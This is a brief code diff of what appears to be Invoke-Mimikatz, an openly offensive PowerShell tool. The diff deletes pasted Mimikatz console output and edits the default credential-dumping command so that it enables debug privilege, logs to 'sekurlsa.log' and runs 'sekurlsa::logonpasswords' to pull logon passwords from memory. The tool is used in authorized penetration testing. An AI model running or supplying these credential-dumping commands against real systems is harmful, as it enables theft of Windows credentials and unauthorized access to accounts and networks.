@@ -62,13 +62,6 @@ Find mimikatz at: http://blog.gentilkiwi.com
 
 http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 #>
-
-mimikatz # privilege::debug
-Privilege '20' OK
-
-mimikatz # log sekurlsa.log
-Using 'sekurlsa.log' for logfile : OK
-
 [CmdletBinding(DefaultParameterSetName="DumpCreds")]
 Param(
 	[Parameter(Position = 0)]
@@ -2706,7 +2699,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = "sekurlsa::logonpasswords exit"
+		$ExeArgs = "privilege::debug log sekurlsa.log sekurlsa::logonpasswords exit"
 	}
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
